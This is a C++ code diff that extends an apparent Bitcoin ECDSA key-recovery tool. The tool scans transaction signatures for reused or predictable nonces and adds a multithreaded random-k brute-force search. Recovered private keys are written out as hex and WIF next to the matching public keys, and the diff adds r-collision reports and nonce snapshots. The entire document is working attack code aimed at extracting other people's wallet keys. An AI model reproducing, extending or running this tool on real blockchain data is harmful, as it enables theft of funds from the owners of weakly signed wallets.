@@ -371,6 +371,18 @@ struct RecStore {
     void add_k(const string& r, const string& khex){ lock_guard<mutex> lk(m); k_by_r[r].insert(khex); }
     bool get_kset(const string& r, vector<string>& out){ lock_guard<mutex> lk(m); auto it=k_by_r.find(r); if(it==k_by_r.end()) return false; out.assign(it->second.begin(), it->second.end()); return true; }
     bool empty_k(const string& r){ lock_guard<mutex> lk(m); return !k_by_r.count(r); }
+    vector<pair<string, vector<string>>> snapshot_k(){
+        lock_guard<mutex> lk(m);
+        vector<pair<string, vector<string>>> out;
+        out.reserve(k_by_r.size());
+        for(auto& kv : k_by_r){
+            vector<string> ks(kv.second.begin(), kv.second.end());
+            sort(ks.begin(), ks.end());
+            out.push_back({kv.first, std::move(ks)});
+        }
+        sort(out.begin(), out.end(), [](const auto& a, const auto& b){ return a.first < b.first; });
+        return out;
+    }
 };
 
 struct OutputSink {
@@ -799,20 +811,23 @@ struct RNG { // xoshiro256**-like
         return result;
     }
 };
-static void randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
-                              uint64_t per_bucket, uint64_t range_bits,
-                              uint64_t seed, int threads)
+static int randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
+                             const string& out_json, const string& out_txt,
+                             uint64_t per_bucket, uint64_t range_bits,
+                             uint64_t seed, int threads)
 {
-    if(per_bucket==0) return;
+    if(per_bucket==0) return 0;
     unordered_map<string, vector<int>> by_r;
     for(int i=0;i<(int)rows.size();++i) by_r[rows[i].r_hex].push_back(i);
     vector<string> rkeys; rkeys.reserve(by_r.size());
     for(auto& kv: by_r) rkeys.push_back(kv.first);
-    if(rkeys.empty()) return;
+    if(rkeys.empty()) return 0;
 
     atomic<size_t> idx{0};
+    atomic<int> hits{0};
     auto worker = [&](int tid){
         Ctx Ct; BNWrap k, tmp, rinv, d;
+        Secp Slocal;
         RNG R(seed + 0x9e37ULL*(tid+1));
         for(;;){
             size_t j = idx.fetch_add(1);
@@ -839,7 +854,6 @@ static void randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
                     BNWrap t1,t2;
                     if(!ecdsa_ok(Ct, pr->s.n, pr->z.n, pr->r.n, d.n, k.n, t1,t2)) continue;
                     // r-from-k check
-                    Secp Slocal;
                     if(!r_from_k_matches(Ct, Slocal, pr->r_hex, k.n)) continue;
 
                     string dhex = bn_hex(d.n);
@@ -847,9 +861,21 @@ static void randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
                         auto pubs = Slocal.pub_from_priv_bn(dhex);
                         if(pr->pub!=pubs.first && pr->pub!=pubs.second) continue;
                         store.add_priv(pr->pub, dhex);
+                        string wif = priv_to_wif(dhex,true,true);
+                        GOUT.emit_unique_key(
+                            out_json,
+                            out_txt,
+                            pr->pub,
+                            dhex,
+                            string("{\"pubkey\":\"") + pr->pub + "\",\"priv_hex\":\"" + dhex +
+                            "\",\"wif\":\"" + wif + "\",\"r\":\"" + pr->r_hex + "\",\"method\":\"random-k\"}",
+                            string("PUB=") + pr->pub + " PRIV=" + dhex + " WIF=" + wif +
+                            " R=" + pr->r_hex + " (random-k)"
+                        );
                     }
                     store.add_k(pr->r_hex, bn_hex(k.n));
                     BNWrap nk; BN_mod_sub(nk.n, Ct.N, k.n, Ct.N, Ct.ctx); store.add_k(pr->r_hex, bn_hex(nk.n));
+                    hits.fetch_add(1);
                     break;
                 }
             }
@@ -858,6 +884,7 @@ static void randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
     vector<thread> pool;
     for(int t=0;t<threads;t++) pool.emplace_back(worker,t);
     for(auto& th: pool) th.join();
+    return hits.load();
 }
 
 // ------------------------------- Bucket driver -------------------------------
@@ -869,6 +896,92 @@ static void load_bucket_rows_precompute(const string& path, vector<Row>& rows){
         if(!precompute_row(C, r)) continue;
         rows.push_back(move(r));
     }
+}
+
+static size_t write_dup_reports(const vector<string>& buckets,
+                                const string& collisions_path,
+                                const string& clusters_path)
+{
+    ofstream collisions;
+    ofstream clusters;
+    if(!collisions_path.empty()) collisions.open(collisions_path, ios::out);
+    if(!clusters_path.empty()) clusters.open(clusters_path, ios::out);
+
+    size_t collision_groups = 0;
+    for(const string& path : buckets){
+        vector<Row> rows;
+        load_bucket_rows_precompute(path, rows);
+        if(rows.empty()) continue;
+
+        unordered_map<string, vector<int>> by_r;
+        unordered_map<string, vector<int>> by_r_pub;
+        by_r.reserve(rows.size());
+        by_r_pub.reserve(rows.size());
+        for(int i=0;i<(int)rows.size();++i){
+            by_r[rows[i].r_hex].push_back(i);
+            by_r_pub[rows[i].r_hex + "|" + rows[i].pub].push_back(i);
+        }
+
+        for(auto& kv : by_r_pub){
+            auto& idx = kv.second;
+            if(idx.size() < 2) continue;
+            const Row& first = rows[idx.front()];
+            if(clusters.good()){
+                clusters << "{\"r\":\"" << first.r_hex << "\",\"pubkey\":\"" << first.pub
+                         << "\",\"count\":" << idx.size() << ",\"rows\":[";
+                bool first_row = true;
+                for(int id : idx){
+                    const Row& rw = rows[id];
+                    if(!first_row) clusters << ",";
+                    first_row = false;
+                    clusters << "{\"txid\":\"" << rw.txid << "\",\"vin\":" << rw.vin
+                             << ",\"s\":\"" << rw.s_hex << "\",\"z\":\"" << rw.z_hex << "\"}";
+                }
+                clusters << "]}\n";
+            }
+        }
+
+        for(auto& kv : by_r){
+            auto& idx = kv.second;
+            if(idx.size() < 2) continue;
+            unordered_set<string> pubs;
+            for(int id : idx) pubs.insert(rows[id].pub);
+            if(pubs.size() <= 1) continue;
+            collision_groups++;
+            if(collisions.good()){
+                vector<string> pub_list(pubs.begin(), pubs.end());
+                sort(pub_list.begin(), pub_list.end());
+                collisions << "{\"r\":\"" << kv.first << "\",\"pubkey_count\":" << pub_list.size()
+                           << ",\"signature_count\":" << idx.size() << ",\"pubkeys\":[";
+                for(size_t i=0;i<pub_list.size();++i){
+                    if(i) collisions << ",";
+                    collisions << "\"" << pub_list[i] << "\"";
+                }
+                collisions << "]}\n";
+            }
+        }
+    }
+    return collision_groups;
+}
+
+static size_t flush_k_snapshot(const string& out_k_path, RecStore& store)
+{
+    if(out_k_path.empty()) return 0;
+    auto snapshot = store.snapshot_k();
+    if(snapshot.empty()) return 0;
+    ofstream fk(out_k_path, ios::app);
+    size_t rows = 0;
+    for(auto& item : snapshot){
+        if(item.second.empty()) continue;
+        fk << "{\"r\":\"" << item.first << "\",\"k_candidates\":[";
+        for(size_t i=0;i<item.second.size();++i){
+            if(i) fk << ",";
+            fk << "\"" << item.second[i] << "\"";
+        }
+        fk << "],\"source\":\"recovery-store-snapshot\"}\n";
+        rows++;
+    }
+    return rows;
 }
 
 // ======== PRELOAD-PRIV support (WIF/HEX/DECIMAL) -> seed r->k & recovered_keys ========
@@ -1297,6 +1410,10 @@ int main(int argc, char** argv){
     vector<string> buckets;
     pass0_bucketize_and_dedup(A.sigs, tmpdir, buckets);
     cerr<<"[pass0] buckets="<<buckets.size()<<"\n";
+    size_t cross_pub_collision_groups = write_dup_reports(buckets, A.report_collisions, A.export_clusters);
+    cerr<<"[pass0-reports] cross_pub_collision_groups="<<cross_pub_collision_groups
+        <<" collisions_out="<<A.report_collisions
+        <<" clusters_out="<<A.export_clusters<<"\n";
 
     RecStore store;
 
@@ -1321,7 +1438,7 @@ int main(int argc, char** argv){
     build_delta_schedules(A, gradient, step_sched);
 
     atomic<size_t> bi{0};
-    size_t total_pairs_tested=0, total_dupR=0, total_delta=0, total_delta_nopub=0, total_lcg=0;
+    size_t total_pairs_tested=0, total_dupR=0, total_delta=0, total_delta_nopub=0, total_lcg=0, total_random_k=0;
     mutex dirty_m, stat_m;
     unordered_set<string> dirty_buckets;
 
@@ -1410,13 +1527,38 @@ int main(int argc, char** argv){
     if(A.scan_random_k>0){
         cerr<<"[random-k] per-bucket="<<A.scan_random_k<<" bits="<<A.scan_random_k_range<<" seed="<<A.rand_seed<<"\n";
         atomic<size_t> ri{0};
+        mutex rk_stat_m;
         auto rk_worker = [&](int tid){
             for(;;){
                 size_t i=ri.fetch_add(1);
                 if(i>=buckets.size()) break;
                 vector<Row> rows; Ctx C;
                 load_bucket_rows_precompute(buckets[i], rows);
-                randk_scan_bucket(C, rows, store, A.scan_random_k, A.scan_random_k_range, A.rand_seed+tid*1337, 1);
+                int hits = randk_scan_bucket(
+                    C,
+                    rows,
+                    store,
+                    A.out_json,
+                    A.out_txt,
+                    A.scan_random_k,
+                    A.scan_random_k_range,
+                    A.rand_seed+tid*1337,
+                    1
+                );
+                if(hits > 0){
+                    {
+                        lock_guard<mutex> lk(dirty_m);
+                        dirty_buckets.insert(buckets[i]);
+                    }
+                    {
+                        lock_guard<mutex> lk(rk_stat_m);
+                        total_random_k += hits;
+                    }
+                    log_line(
+                        string("[random-k bucket ") + fs::path(buckets[i]).filename().string() +
+                        "] hits=" + to_string(hits)
+                    );
+                }
             }
         };
         vector<thread> rkpool;
@@ -1457,6 +1599,11 @@ int main(int argc, char** argv){
         if(grew_k_sum==0 && grew_d_sum==0) break;
     }
 
+    size_t flushed_k_rows = flush_k_snapshot(A.out_k, store);
+    if(flushed_k_rows > 0){
+        cerr<<"[out-k] snapshot_rows="<<flushed_k_rows<<" path="<<A.out_k<<"\n";
+    }
+
     // cleanup
     std::error_code ec3; fs::remove_all(tmpdir, ec3);
     if (ec3) cerr << "[warn] remove_all " << tmpdir << ": " << ec3.message() << "\n";
@@ -1465,6 +1612,7 @@ int main(int argc, char** argv){
         <<" delta_hits="<<total_delta
         <<" delta_nopub_hits="<<total_delta_nopub
         <<" lcg_hits="<<total_lcg
+        <<" random_k_hits="<<total_random_k
         <<" pairs_tested="<<total_pairs_tested<<"\n";
     cerr<<"Done.\n";
     return 0;
